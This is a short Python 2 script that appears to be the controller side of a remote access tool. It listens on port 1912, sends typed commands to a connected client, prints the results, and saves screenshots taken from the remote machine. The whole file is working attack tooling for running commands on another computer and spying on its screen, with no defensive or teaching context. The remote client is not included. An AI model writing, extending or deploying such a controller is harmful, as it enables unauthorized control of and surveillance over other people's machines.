import socket
import time
import threading
import gtk.gdk
from datetime import datetime
now = datetime.now()

host = ''
port = 1912

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((host,port))
s.listen(1)
print "[+] Waitting Client..."
conn, addr = s.accept()
print "[+] Connected "
msg = ''
while msg != "exit":
	msg = raw_input(">> ")
	if msg != "":
		conn.send(msg)
		time.sleep(0.1)
		if msg[:3] == "cmd":
			while True:
			   data = conn.recv(1024)
			   if data:
			  	print data
				break
			   else:
				pass
		elif msg == "screenshot":
			name = "["+str(now.hour)+":"+str(now.minute)+":"+str(now.second)+"] Screenshot.png"
			f = open(name, "wb")
			data = conn.recv(1024)
		        while data:
			    f.write(data)
			    data = conn.recv(1024)
		        f.close()		
		pass
s.close()		
